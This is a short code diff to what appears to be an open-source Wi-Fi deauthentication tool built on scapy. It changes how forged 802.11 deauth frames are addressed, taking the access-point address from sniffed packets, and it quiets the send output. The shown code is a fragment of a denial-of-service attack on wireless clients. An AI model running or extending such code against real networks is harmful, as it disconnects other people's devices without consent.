@@ -21,7 +21,7 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
 
-from scapy.all import sniff, Dot11, RadioTap, Dot11Deauth, packet, conf
+from scapy.all import sniff, Dot11, RadioTap, Dot11Deauth, packet, conf, sendp
 from logging import info, warning, debug
 from argparse import ArgumentParser
 from platform import system
@@ -111,11 +111,12 @@ class WifiDeauth:
                 type=0,
                 subtype=12,
                 addr1=packet.addr2,
-                addr2=self.bssid,
-                addr3=self.bssid,
+                addr2=packet.addr3,
+                addr3=packet.addr3,
             )
             / Dot11Deauth(reason=7),
             iface=self.interface,
+            verbose=0,
         )
         info(f"Send deauth to {packet.addr2}")
 
